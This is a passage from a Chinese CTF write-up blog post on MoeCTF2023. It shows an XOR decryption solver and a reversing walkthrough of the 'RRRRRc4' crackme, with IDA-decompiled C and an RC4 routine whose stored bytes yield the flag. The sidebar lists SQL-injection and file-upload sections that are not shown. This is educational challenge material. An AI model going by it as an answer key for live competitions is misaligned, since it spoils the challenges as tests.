使用异或运算解密</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> encLen = <span class="keyword">sizeof</span>(enc) / <span class="keyword">sizeof</span>(enc[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> keyLen = <span class="keyword">sizeof</span>(key) / <span class="keyword">sizeof</span>(key[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    decrypt(enc, encLen, key, keyLen);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted message: %s\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/50.png"></p>

        <h2 id="RRRRRc4">
          <a href="#RRRRRc4" class="heading-link"><i class="fas fa-link"></i></a><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2>
      
        <h3 id="查壳-1">
          <a href="#查壳-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查壳-1" class="headerlink" title="查壳"></a>查壳</h3>
      <p><img src="/2023/08/18/MoeCTF2023/51.png"></p>

        <h3 id="IDA分析">
          <a href="#IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3>
      <p><img src="/2023/08/18/MoeCTF2023/52.png"><br>跳转后反汇编</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_140079A70</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+30h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [rsp+40h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [rsp+160h] [rbp+130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">44</span>]; <span class="comment">// [rsp+278h] [rbp+248h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2A4h] [rbp+274h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2C4h] [rbp+294h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">172</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_14007555C</span>(&amp;unk_1401A7007);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="built_in">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;moectf2023&quot;</span>);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_140073581</span>(<span class="string">&quot;welcome to moectf!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_140073581</span>(<span class="string">&quot;This is a very common algorithm &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_140073581</span>(<span class="string">&quot;show your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_1400727F8</span>(<span class="string">&quot;%s&quot;</span>, byte_140197260);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_140073829</span>(byte_140197260) == <span class="number">37</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_140075052</span>((<span class="type">unsigned</span> <span class="type">int</span>)v5, (<span class="type">unsigned</span> <span class="type">int</span>)v6, (<span class="type">unsigned</span> <span class="type">int</span>)byte_140197260, <span class="number">38</span>, (__int64)v7, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)j &lt; <span class="number">0x26</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_140196000[j] == (<span class="type">unsigned</span> __int8)byte_140197260[j] )</span><br><span class="line">        ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">37</span> )</span><br><span class="line">    <span class="built_in">sub_140073973</span>(<span class="string">&quot;right!flag is your input!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">sub_140073973</span>(<span class="string">&quot;try again~&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_140074BCF</span>(v3, &amp;unk_140162100);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

        <h3 id="代码审计-2">
          <a href="#代码审计-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3>
      <p>此时我们观察到要输出flag就要v8&#x3D;37；要v8&#x3D;37就要执行v8++；要v8++就要执行<code>byte_140196000[j] == (unsigned __int8)byte_140197260[j]</code><br><img src="/2023/08/18/MoeCTF2023/53.png"><br>此时我们跳转到这个判断函数看看；此时已经给出了结果<br><img src="/2023/08/18/MoeCTF2023/54.png"><br>此时我们看看我们的<code>(unsigned __int8)byte_140197260[j]</code>经过了什么处理<br><img src="/2023/08/18/MoeCTF2023/55.png"><br>此时我们继续跟进<code>sub_140075052</code>这个函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400795E0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, <span class="type">int</span> a4, __int64 a5, <span class="type">unsigned</span> <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line"></span><br><span class="line">  result = sub_14007555C(&amp;unk_1401A7007);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = i;</span><br><span class="line">    *(_BYTE *)(a2 + i) = *(_BYTE *)(a5 + i % a6);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (*(<span class="type">unsigned</span> __int8 *)(a2 + j) + *(<span class="type">unsigned</span> __int8 *)(a1 + j) + v10) % <span class="number">256</span>;</span><br><span class="line">    v12 = *(_BYTE *)(a1 + v10);</span><br><span class="line">    *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j);</span><br><span class="line">    *(_BYTE *)(a1 + j) = v12;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v11 = (*(<span class="type">unsigned</span> __int8 *)(a1 + v9) + v11) % <span class="number">256</span>;</span><br><span class="line">    v13 = *(_BYTE *)(a1 + v11);</span><br><span class="line">    *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9);</span><br><span class="line">    *(_BYTE *)(a1 + v9) = v13;</span><br><span class="line">    *(_BYTE *)(a3 + v14++) ^= *(_BYTE *)(a1 + (*(<span class="type">unsigned</span> __int8 *)(a1 + v11) + *(<span class="type">unsigned</span> __int8 *)(a1 + v9)) % <span class="number">256</span>);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)--a4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>跟进之后经过AI的解释后发现这个是一个rc4的一个加密函数<br>所以这一整个过程就是你输入的值经过了rc4的加密之后的值要和<code>byte_140196000[j]</code>数组中的值相等；所以此时我们直接把<code>byte_140196000[j]</code>的值拿去rc4解密即可获得我们应该输入的值也就是flag<br><img src="/2023/08/18/MoeCTF2023/56.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文結束，感謝您的閱讀 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文連結: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/08/18/MoeCTF2023/">https://hyggevv.github.io/2023/08/18/MoeCTF2023/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版權聲明: </span><span class="copyright-notice__value">本部落格所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 許可協議。轉載請注明出處！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/25/23%E5%9B%BD%E6%8A%A4/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">希望明年还能拥有属于蓝色和红色的夏天</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/08/13/%E5%88%9D%E6%8E%A2Linux%E6%8F%90%E6%9D%83/"><span class="paginator-prev__text">初探Linux提权</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目錄</span><span class="sidebar-nav-ov">本站概覽</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">
          WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-number">1.1.</span> <span class="toc-text">
          http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">1.2.</span> <span class="toc-text">
          Web入门指北</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="toc-number">1.3.</span> <span class="toc-text">
          彼岸的flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gas-gas-gas"><span class="toc-number">1.4.</span> <span class="toc-text">
          gas!gas!gas!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie"><span class="toc-number">1.5.</span> <span class="toc-text">
          Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="toc-number">1.6.</span> <span class="toc-text">
          moe图床</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.6.1.</span> <span class="toc-text">
          js代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.6.2.</span> <span class="toc-text">
          php代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.3.</span> <span class="toc-text">
          文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="toc-number">1.7.</span> <span class="toc-text">
          了解你的座驾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">1.7.1.</span> <span class="toc-text">
          poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.7.2.</span> <span class="toc-text">
          payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-number">1.8.</span> <span class="toc-text">
          大海捞针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meo%E7%9A%84%E5%9B%BE%E5%BA%8A"><span class="toc-number">1.9.</span> <span class="toc-text">
          meo的图床</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.9.1.</span> <span class="toc-text">
          代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5%E5%BC%B1%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.2.</span> <span class="toc-text">
          MD5弱比较绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%83%E6%B5%B7%E7%9A%84%E5%B0%8F%E5%B1%8B"><span class="toc-number">1.10.</span> <span class="toc-text">
          心海的小屋</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.10.1.</span> <span class="toc-text">
          信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.10.2.</span> <span class="toc-text">
          源码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93"><span class="toc-number">1.10.3.</span> <span class="toc-text">
          爆库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8"><span class="toc-number">1.10.4.</span> <span class="toc-text">
          爆表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%88%97"><span class="toc-number">1.10.5.</span> <span class="toc-text">
          爆列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">1.10.6.</span> <span class="toc-text">
          爆数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jail"><span class="toc-number">2.</span> <span class="toc-text">
          Jail</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-0"><span class="toc-number">2.1.</span> <span class="toc-text">
          Jail Level 0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">
          payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">
          MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">3.1.</span> <span class="toc-text">
          Misc 入门指北</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%871"><span class="toc-number">3.2.</span> <span class="toc-text">
          打不开的图片1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%872"><span class="toc-number">3.3.</span> <span class="toc-text">
          打不开的图片2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#building-near-lake"><span class="toc-number">3.4.</span> <span class="toc-text">
          building_near_lake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">3.5.</span> <span class="toc-text">
          奇怪的压缩包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%AB%E7%83%AB%E7%83%AB"><span class="toc-number">3.6.</span> <span class="toc-text">
          烫烫烫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E6%83%B3%E8%A6%81flag%E5%90%97"><span class="toc-number">3.7.</span> <span class="toc-text">
          你想要flag吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-1-%E6%99%AE%E9%80%9A%E7%9A%84%E7%8C%AB"><span class="toc-number">3.8.</span> <span class="toc-text">
          狗子(1) 普通的猫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-2-%E7%85%A7%E7%89%87"><span class="toc-number">3.9.</span> <span class="toc-text">
          狗子(2) 照片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-3-%E5%AF%9D%E5%AE%A4"><span class="toc-number">3.10.</span> <span class="toc-text">
          狗子(3) 寝室</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">
          Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">4.1.</span> <span class="toc-text">
          Reverse入门指北</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base-64"><span class="toc-number">4.2.</span> <span class="toc-text">
          base_64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">4.2.1.</span> <span class="toc-text">
          py代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.2.2.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xor"><span class="toc-number">4.3.</span> <span class="toc-text">
          Xor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UPX%EF%BC%81"><span class="toc-number">4.4.</span> <span class="toc-text">
          UPX！</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E5%A3%B3"><span class="toc-number">4.4.1.</span> <span class="toc-text">
          查壳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%B1%E5%A3%B3"><span class="toc-number">4.4.2.</span> <span class="toc-text">
          脱壳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">4.4.3.</span> <span class="toc-text">
          IDA逆向分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">4.4.4.</span> <span class="toc-text">
          c代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">4.4.5.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ANDROID"><span class="toc-number">4.5.</span> <span class="toc-text">
           ANDROID</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MainActivity%E7%9A%84%E5%AF%BB%E6%89%BE"><span class="toc-number">4.5.1.</span> <span class="toc-text">
          MainActivity的寻找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="toc-number">4.5.2.</span> <span class="toc-text">
          代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">4.5.3.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RRRRRc4"><span class="toc-number">4.6.</span> <span class="toc-text">
          RRRRRc4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E5%A3%B3-1"><span class="toc-number">4.6.1.</span> <span class="toc-text">
          查壳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">4.6.2.</span> <span class="toc-text">
          IDA分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2"><span class="toc-number">4.6.3.</span> <span class="toc-text">
          代码审计</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">114</div><div class="sidebar-ov-state-item__name">歸檔</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">分類</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">標籤</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知識共享許可協議" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已閱讀了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 強力驅動</span><span> v5.4.2</span><span class="footer__devider">|</span><span>主題 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">總瀏覽次數</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>